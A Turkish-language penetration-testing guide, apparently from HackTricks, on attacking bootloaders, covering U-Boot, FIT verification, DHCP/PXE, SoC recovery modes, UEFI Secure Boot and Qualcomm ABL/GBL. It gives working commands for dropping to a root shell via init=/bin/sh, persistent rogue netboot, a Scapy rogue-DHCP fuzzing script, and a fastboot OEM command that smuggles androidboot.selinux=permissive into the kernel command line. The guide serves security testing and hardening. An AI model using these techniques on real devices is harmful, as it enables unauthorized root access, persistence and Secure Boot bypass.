# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını değiştirmek ve U-Boot ile UEFI sınıfı loader'lar gibi bootloader'ları test etmek için önerilir. Erken aşamada code execution elde etmeye, signature/rollback korumalarını değerlendirmeye ve recovery ya da network-boot yollarını kötüye kullanmaya odaklanın.

İlgili: bl2_ext patching üzerinden MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins ve environment kötüye kullanımı

1. Interpreter shell'e erişin
- Boot sırasında, `bootcmd` çalışmadan önce bilinen bir break tuşuna (genellikle herhangi bir tuş, 0, space veya board'a özel bir "magic" sequence) basarak U-Boot prompt'una düşün.<sup>[[1]](#references)</sup>

2. Boot state ve değişkenleri inceleyin
- Yararlı komutlar:
- `printenv` (environment'ı döker)
- `bdinfo` (board bilgisi, memory adresleri)
- `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
- `help ext4load; help fatload; help tftpboot` (kullanılabilir loader'lar)

3. Root shell elde etmek için boot argümanlarını değiştirin
- Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # veya: run bootcmd
```

4. TFTP server'ınızdan netboot yapın
- Network'ü yapılandırın ve LAN üzerinden bir kernel/fit image alın:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Değişiklikleri environment üzerinden kalıcı hale getirin
- Env storage write-protected değilse control'ü kalıcı hale getirebilirsiniz:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Fallback path'lerini etkileyen `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi değişkenleri kontrol edin. Yanlış yapılandırılmış değerler shell'e tekrar tekrar break verilmesini sağlayabilir.

6. Debug/unsafe özellikleri kontrol edin
- Şunları arayın: `bootdelay` > 0, `autoboot` disabled, kısıtlanmamış `usb start; fatload usb 0:1 ...`, serial üzerinden `loady`/`loads` kullanabilme, güvenilmeyen media'dan `env import` ve signature check yapılmadan yüklenen kernel/ramdisk'ler.

7. U-Boot image/verification testing
- Platform secure/verified boot için FIT images kullandığını belirtiyorsa hem unsigned hem de değiştirilmiş image'ları deneyin:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # FIT sig enforced ise FAIL olmalı
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # FAIL olmalı
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # yalnızca key trusted ise boot etmeli
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` bulunmaması veya legacy `verify=n` davranışı çoğu zaman arbitrary payload'ların boot edilmesine izin verir.
- Basit bir allow/deny sonucuyla yetinmeyin: yakın tarihli FIT araştırmaları, verification path'in kendisinin pre-auth attack surface olabileceğini gösterdi. Harici olarak tutulan FIT data'sını (`data-offset`, `data-position`, `data-size`), signed configuration selection'ı, `loadables`'ı ve overlay / `extra-conf` işleme mantığını negative-test edin.
- Eşleşen bir source tree'niz varsa `test/vboot/vboot_test.sh`, gerçek hardware'e dokunmadan önce U-Boot sandbox içinde FIT verification davranışını yeniden üretmenin hızlı bir yoludur.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` ve script bootflow'ları
- Modern U-Boot build'lerinde `bootcmd` çoğu zaman Standard Boot etrafında bir wrapper'dır. Bu, görünür environment zararsız görünse bile writable media, PXE veya SPI flash'ın gerçek trust boundary haline gelebileceği anlamına gelir.
- `extlinux` bootmeth, `/` ve `/boot` altında `extlinux/extlinux.conf` dosyasını arar; script bootmeth önce `boot.scr.uimg`, ardından `boot.scr` dosyasını arar. Network boot sırasında script filename `boot_script_dhcp` üzerinden gelebilir.
- Yararlı triage komutları:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Test edilmesi gereken abuse case'leri: `boot_targets` içinde attacker-controlled USB/SD media'nın daha önce gelmesi, writable `/boot/extlinux/extlinux.conf`, rogue TFTP'nin `boot.scr` sağlaması veya `script_offset_f` üzerinden SPI-backed script execution.
- Platform FIT verification'a dayanıyorsa configuration'ların yalnızca image başına değil configuration seviyesinde de signed olduğundan emin olun; `required-mode=all`, herhangi tek bir required key'i kabul etmekten daha güçlüdür.

## Network-boot surface (DHCP/PXE) ve rogue server'lar

9. PXE/DHCP parameter fuzzing
- U-Boot'un legacy BOOTP/DHCP handling kodunda memory-safety sorunları görülmüştür. Örneğin CVE‑2024‑42040, crafted DHCP response'ları yoluyla U-Boot memory'sinden byte'ların wire üzerinden leak edilmesine neden olan memory disclosure'ı açıklar.<sup>[[4]](#references)</sup> DHCP/PXE code path'lerini aşırı uzun veya edge-case değerlerle (option 67 bootfile-name, vendor option'ları, file/servername alanları) exercise edin ve hang/leak olup olmadığını gözlemleyin.
- Netboot sırasında boot parametrelerini stress-test etmek için minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- PXE filename alanlarının OS-side provisioning script'lerine zincirlendiğinde sanitization olmadan shell/loader logic'e aktarılıp aktarılmadığını da doğrulayın.

10. Rogue DHCP server command injection testing
- Rogue bir DHCP/PXE service kurun ve boot chain'in sonraki aşamalarında command interpreter'lara ulaşmak için filename veya option alanlarına karakterler inject etmeyi deneyin. Metasploit'in DHCP auxiliary'si, `dnsmasq` veya custom Scapy script'leri iyi çalışır. Önce lab network'ünü izole ettiğinizden emin olun.

## Normal boot'u override eden SoC ROM recovery mode'ları

Birçok SoC, flash image'ları geçersiz olsa bile USB/UART üzerinden code kabul eden bir BootROM "loader" mode'u sunar. Secure-boot fuse'ları blown değilse bu, chain'in çok erken bir aşamasında arbitrary code execution sağlayabilir.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) veya `imx-usb-loader`.
- Örnek: RAM üzerinden custom U-Boot push edip çalıştırmak için `imx-usb-loader u-boot.imx`.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Örnek: loader'ı stage edip custom U-Boot upload etmek için `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`.

Cihazda secure-boot eFuse/OTP'lerin burned olup olmadığını değerlendirin. Değilse BootROM download mode'ları, first-stage payload'ınızı doğrudan SRAM/DRAM'den execute ederek daha yüksek seviyedeki verification'ları (U-Boot, kernel, rootfs) çoğu zaman bypass eder.

## UEFI/PC-class bootloader'ları: hızlı kontroller

11. ESP tampering, rollback ve key-enrollment testing
- EFI System Partition'ı (ESP) mount edin ve loader component'lerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo path'leri.
- Mümkün olduğunda OS üzerinden Secure Boot state'ini ve key database'lerini dump edin:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Platform Setup Mode'daysa, unauthenticated key enrollment'ı kabul ediyorsa veya test/default Platform Key (PKfail class) ile geliyorsa local admin ya da physical attacker kendi KEK/db'sini enroll edebilir ve arbitrary EFI binary'lerini boot ederken Secure Boot'u “enabled” olarak gösterebilir.<sup>[[3]](#references)</sup>
- Secure Boot revocation'ları (dbx) güncel değilse downgraded veya known-vulnerable signed boot component'leriyle boot etmeyi deneyin. Platform hâlâ eski shim/bootmanager'lara trust ediyorsa persistence elde etmek için çoğu zaman ESP'den kendi kernel'inizi veya `grub.cfg` dosyanızı yükleyebilirsiniz.

12. Stale shim / SBAT / dbx revocation testing
- Eski Microsoft-signed shim'ler ve vendor fork'ları, revocation'lar stale ise BYOVD-style bootkit path olarak kullanılabilir. Isolated bir lab'da historical olarak vulnerable bir shim'i ESP'ye yerleştirin ve kendi `grubx64.efi` dosyanızı veya kernel'inizi chainload etmeyi deneyin.<sup>[[11]](#references)</sup>
- Hızlı triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Shim revocation list'te olmasına rağmen hâlâ çalışıyorsa firmware/OS stale `dbx` update'lerine sahiptir veya upstream SBAT protections'ı hiçbir zaman devralmamış forked bir loader'a trust ediyordur.

13. Boot logo parsing bug'ları (LogoFAIL class)
- Birkaç OEM/IBV firmware'i, boot logo'larını işleyen DXE içindeki image-parsing flaw'larına karşı vulnerable'dı. Bir attacker vendor-specific bir path altında ESP'ye crafted image yerleştirebiliyor (ör. `\EFI\<vendor>\logo\*.bmp`) ve reboot gerçekleştirebiliyorsa Secure Boot enabled olsa bile early boot sırasında code execution mümkün olabilir. Platformun user-supplied logo'ları kabul edip etmediğini ve bu path'lerin OS'den writable olup olmadığını test edin.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gap'leri

Qualcomm'un **Generic Bootloader Library (GBL)** yüklemek için ABL kullanan Android 16 cihazlarda, ABL'nin `efisp` partition'ından yüklediği UEFI app'i **authenticate** edip etmediğini doğrulayın. ABL yalnızca bir UEFI app'in **presence** durumunu kontrol ediyor ve signature'ları verify etmiyorsa `efisp` için bir write primitive, boot sırasında **pre-OS unsigned code execution** haline gelir.<sup>[[6]](#references)[[7]](#references)</sup>

Practical check'ler ve abuse path'leri:

- **efisp write primitive**: `efisp` içine custom bir UEFI app yazmanın bir yoluna ihtiyacınız vardır (root/privileged service, OEM app bug'ı, recovery/fastboot path'i). Bu olmadan GBL loading gap'ine doğrudan erişilemez.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug'ı): Bazı build'ler `fastboot oem set-gpu-preemption` komutunda extra token'ları kabul eder ve bunları kernel cmdline'a append eder. Bu, protected partition write'larını etkinleştiren permissive SELinux'u zorlamak için kullanılabilir:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Cihaz patched ise komut extra argument'ları reject etmelidir.<sup>[[5]](#references)[[6]](#references)</sup>
- **Persistent flag'ler üzerinden bootloader unlock**: Bir boot-stage payload, OEM server/approval gate'leri olmadan `fastboot oem unlock` davranışını taklit etmek için persistent unlock flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) değiştirebilir. Bu, bir sonraki reboot sonrasında kalıcı bir posture değişikliğidir.<sup>[[6]](#references)</sup>

Defensive/triage notları:

- ABL'nin `efisp` içindeki GBL/UEFI payload'ı üzerinde signature verification gerçekleştirip gerçekleştirmediğini doğrulayın. Gerçekleştirmiyorsa `efisp`'i high-risk persistence surface olarak değerlendirin.
- ABL fastboot OEM handler'larının **argument count'larını validate** edecek ve additional token'ları reject edecek şekilde patched olup olmadığını takip edin.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

Early boot sırasında SPI/NAND flash ile etkileşime girerken (ör. read'leri bypass etmek için pin'leri ground'larken) dikkatli olun ve her zaman flash datasheet'ine başvurun. Zamanlaması hatalı shorts cihazı veya programmer'ı bozabilir.

## Notes and additional tips

- Environment blob'larını RAM ve storage arasında taşımak için `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` komutlarını deneyin; bazı platformlar removable media'dan authentication olmadan env import edilmesine izin verir.
- `extlinux.conf` üzerinden boot eden Linux-based sistemlerde, signature check uygulanmıyorsa boot partition içindeki `APPEND` satırını değiştirmek (`init=/bin/sh` veya `rd.break` inject etmek için) çoğu zaman yeterlidir.
- Target dual-slot / A/B update kullanıyorsa bootloader dışındaki updater-only trust gap'lerini kaçırmamak için [firmware analysis overview](README.md) içindeki anti-rollback ve slot-desync tekniklerini inceleyin.
- Userland `fw_printenv/fw_setenv` sağlıyorsa `/etc/fw_env.config` dosyasının gerçek env storage ile eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD region'ını okumanıza/yazmanıza izin verir.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
